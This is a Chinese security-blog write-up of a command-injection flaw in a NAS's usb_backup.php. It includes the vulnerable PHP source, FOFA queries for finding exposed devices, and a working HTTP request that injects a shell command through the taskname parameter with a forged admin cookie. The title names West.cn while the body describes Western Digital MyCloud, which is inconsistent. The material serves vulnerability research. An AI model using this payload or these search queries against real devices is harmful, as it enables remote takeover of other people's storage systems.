---
title: "西部数码 NAS usb_backup.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-usb_backup-rce.html
asset_dir: assets/西部数码-nas-usb_backup.php-命令执行漏洞
---

# 西部数码 NAS usb\_backup.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/8 12:48
* 506浏览
* [0评论](#comment)
* 54分钟阅读

深入探索

SQL注入防护

物流软件安全

Windows安全工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS usb\_backup.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞预警服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `usb_backup.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

define('USB_BACKUPS_CONF', '/var/www/xml/usb_backup.xml');

$action = $_POST['action'];
if ($action == "") $action = $_GET['action'];
......
switch ($action)
{
    case "create":
    {
       $taskname = $_POST['taskname'];
       $category = $_POST['category']; //1:USB->NAS,2:NAS->USB
       $source_dir = $_POST['source_dir'];
       $dest_dir = $_POST['dest_dir'];
       $backup_type = $_POST['backup_type'];
       $auto_start = $_POST['auto_start'];

       $cmd = sprintf("usb_backup -a '%s' -m %s -t %s -d %s -A %s -c jobadd",
                   $taskname, $backup_type, $category, escapeshellarg(htmlstr_decode($dest_dir)), $auto_start);

       foreach ($source_dir as $val)
          $cmd .= sprintf(" -s %s", escapeshellarg(htmlstr_decode($val)));

       pclose(popen($cmd, 'r'));
       $pname = sprintf("/tmp/r_usb!_%s", $taskname);
       @unlink($pname);

       stop_job($taskname);

       //Start job
       $cmd = sprintf("usb_backup -a '%s' -c jobrun &", $taskname);
       pclose(popen($cmd, 'r'));
       sleep(2);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "modify":
    {
       $taskname = $_POST['taskname'];
       $category = $_POST['category']; //1:USB->NAS,2:NAS->USB
       $source_dir = $_POST['source_dir'];
       $dest_dir = $_POST['dest_dir'];
       $backup_type = $_POST['backup_type'];
       $auto_start = $_POST['auto_start'];
       $old_taskname = $_POST['old_taskname'];

       stop_job($taskname);

       $cmd = sprintf("usb_backup -a '%s' -x '%s' -m %s -t %s -d %s -A %s -c jobedit",
                   $taskname, $old_taskname, $backup_type, $category, escapeshellarg(htmlstr_decode($dest_dir)), $auto_start);

       foreach ($source_dir as $val)
          $cmd .= sprintf(" -s %s", escapeshellarg(htmlstr_decode($val)));

       pclose(popen($cmd, 'r'));

       //Start job
       $cmdS = sprintf("usb_backup -a '%s' -c jobrun &", $taskname);
       pclose(popen($cmdS, 'r'));
       sleep(2);

       $r = get_list();
       $r->cmd = $cmd;
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "del":
    {
       $taskname = $_POST['taskname'];

       stop_job($taskname);

       $cmd = sprintf("usb_backup -a '%s' -c jobdel", $taskname);
       pclose(popen($cmd, 'r'));

       $pname = sprintf("/tmp/r_%s!_usb", $taskname);
       @unlink($pname);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "go_jobs":
    {
       $taskname = $_POST['taskname'];

       $pname = sprintf("/tmp/r_%s!_usb", $taskname);
       @unlink($pname);

       $cmd = sprintf("usb_backup -a '%s' -c jobrun &", $taskname);
       pclose(popen($cmd, 'r'));
       sleep(2);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "stop_jobs":
    {
       $taskname = $_POST['taskname'];
       stop_job($taskname);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "go_restore":
    {
       $taskname = $_POST['taskname'];
       $restore_source = $_POST['restore_source'];

       stop_job($taskname);

       $pname = sprintf("/tmp/r_%s!_usb", $taskname);
       file_put_contents($pname, "0"); //Cancel

       $list_xml_file = sprintf("/tmp/r_usb!_restore_imcremental_%s.xml", $taskname);
       if ($restore_source == "")//Sync and Copy
          $cmd = sprintf("usb_backup -a '%s' -o '%s' -c jobrs &", $taskname, $list_xml_file);
       else
          $cmd = sprintf("usb_backup -a '%s' -o '%s' -F %s -c jobrs &", $taskname, $list_xml_file, $_POST['restore_source']);
       pclose(popen($cmd, 'r'));
       sleep(2);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "get_list":
    {
       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

}
```

当`$_POST['action']` = `create`时，`$taskname = $_POST['taskname']`、`$_POST['backup_type']`、`$_POST['category']`和`$_POST['auto_start']`这几个参数均是直接拼接进$cmd中，然后调用**popen**进行执行，期间对这几个参数没有过滤或校验，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞预警服务

类似的问题同样存在于`del` `go_jobs` `go_restore` `stop_jobs` 和 `modify` 操作中，其中 `$backup_type`, `$category`, `$auto_start` `$restore_source` `$taskname`等参数也未被转义。

[![西部数码 NAS usb_backup.php 命令执行漏洞](images/img-001-b7af74a5b4a5.webp)](https://image.mrxn.net/f6edba94e1a94fc3aa6b657701f840a9.webp)

# 漏洞复现

> 需要注意source\_dir应为数组形式，否则foreach循环判断会出错

```
POST /web/backups/usb_backup.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin
Content-Type: application/x-www-form-urlencoded

action=create&taskname=' $(pwd>/var/www/t.png) #' &source_dir[]=
```

[![西部数码 NAS usb_backup.php 命令执行漏洞](images/img-002-3dd264c5d877.webp)](https://image.mrxn.net/9f3d97b46f98424b8809359c78e988e6.webp)

成功[执行命令](https://mrxn.net/tag/rce)并输出结果至测试文件

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS usb\_backup.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-usb_backup-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-usb_backup-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

文件大小转换

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-usb\_backup-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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